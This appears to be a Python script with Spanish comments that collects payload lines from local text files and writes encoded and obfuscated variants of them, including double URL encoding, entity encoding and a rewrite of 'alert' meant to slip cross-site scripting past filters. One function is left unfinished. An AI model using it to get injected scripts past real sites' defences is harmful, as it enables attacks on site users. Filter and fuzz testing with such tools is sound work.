import os
import urllib.parse
import html

# Definiciones de codificaciones
def url_encode(payload):
    return urllib.parse.quote(payload, safe='')

def html_encode(payload):
    return html.escape(payload, quote=True)

def decimal_encode(payload):
    return ''.join(f'&#{ord(c)};' for c in payload)

def spicing_modifier_encode(payload):
    replacements = {
        '(': 'U+207D', ')': 'U+207E', '<': 'U+003C', '>': 'U+003E',
        '[': 'U+005B', ']': 'U+005D', '{': 'U+007B', '}': 'U+007D',
        '"': 'U+0022', "'": 'U+0027', '/': 'U+002F',
    }
    return ''.join(replacements.get(c, c) for c in payload)

# Aplicar doble codificación para un método específico
def aplicar_doble_codificacion(payload, metodo_codificacion):
    # Primera codificación específica y luego URL encode al resultado
    return url_encode(metodo_codificacion(payload))

# Recolectar y unificar payloads desde archivos .txt
def recolectar_payloads(directorio):
    payloads = set()
    for archivo in os.listdir(directorio):
        if archivo.endswith('.txt') and archivo != 'encoded_variants.txt':
            with open(os.path.join(directorio, archivo), 'r', encoding='utf-8') as f:
                payloads.update(f.read().splitlines())
    return list(payloads)

# Guardar los payloads unificados
def guardar_payloads_unificados(payloads, archivo_destino):
    with open(archivo_destino, 'w', encoding='utf-8') as archivo:
        for payload in sorted(payloads):
            archivo.write(f"{payload}\n")

# Función añadida para obfuscar "alert" en el estilo específico que proporcionaste
def obfuscar_alert(payload):
    if 'alert' in payload:
        # Esta es la variación específica basada en tu ejemplo
        return payload.replace("alert", ";m='e'%0Atop['al'+'m'+'rt']")
    return payload

# Función para aplicar obfuscaciones y codificaciones
def aplicar_obfuscaciones(payload, nivel=1):
    # Limitar a tres niveles de obfuscación
    if nivel > 3: 
        return [payload]

    variaciones = [payload]
    codificaciones = [url_encode, html_encode, decimal_encode, spicing_modifier_encode]


def generar_variaciones(payload):
    # El payload original siempre primero
    variaciones = [payload]

    # Lista de funciones de codificación aplicadas al payload
    codificaciones = [url_encode, html_encode, decimal_encode, spicing_modifier_encode]

    # Aplicar cada método de codificación al payload y agregar a la lista
    for codificar in codificaciones:
        variacion = codificar(payload)
        if variacion not in variaciones:
            variaciones.append(variacion)
    
    # Doble codificación: aplicar URL encode después de cada codificación
    for codificar in codificaciones:
        variacion_doble = url_encode(codificar(payload))
        if variacion_doble not in variaciones:
            variaciones.append(variacion_doble)

    # Manejar adecuadamente etiquetas de apertura y cierre
    for especial in ['<', '>']:
        if especial in payload:
            for codificar in codificaciones:
                variacion_especial = payload.replace(especial, codificar(especial))
                if variacion_especial not in variaciones:
                    variaciones.append(variacion_especial)
                # Aplicar doble codificación a la variación especial
                variacion_doble_especial = url_encode(codificar(variacion_especial))
                if variacion_doble_especial not in variaciones:
                    variaciones.append(variacion_doble_especial)

    # Nueva sección para añadir la obfuscación de "alert" y sus variaciones codificadas
    payload_obfus = obfuscar_alert(payload)
    if payload_obfus not in variaciones:
        variaciones.append(payload_obfus)
        # Aplicar codificaciones al payload obfuscado
        for codificar in [url_encode, html_encode, decimal_encode, spicing_modifier_encode]:
            variaciones.append(codificar(payload_obfus))

    return variaciones

# Procesamiento principal
def procesar_payloads(archivo_salida, payloads):
    with open(archivo_salida, 'w', encoding='utf-8') as salida:
        for payload in payloads:
            variaciones = generar_variaciones(payload)
            for var in variaciones:
                salida.write(f"{var}\n")
            salida.write("\n")

# Ejecución del proceso
directorio_actual = os.getcwd()
os.makedirs('output', exist_ok=True)  # Asegura que la carpeta output exista

payloads_unificados = recolectar_payloads(directorio_actual)  # Recolecta payloads

# Guarda los payloads unificados en un archivo en la carpeta output
archivo_repositorio_payloads = os.path.join('output', 'repositorio_payloads.txt')
guardar_payloads_unificados(payloads_unificados, archivo_repositorio_payloads)

# Genera variaciones de los payloads y los almacena
archivo_salida = os.path.join('output', 'encoded_variants.txt')
procesar_payloads(archivo_salida, payloads_unificados)

print(f"Variaciones de payloads guardadas en: {archivo_salida}")
print(f"Repositorio de payloads unificados guardado en: {archivo_repositorio_payloads}")
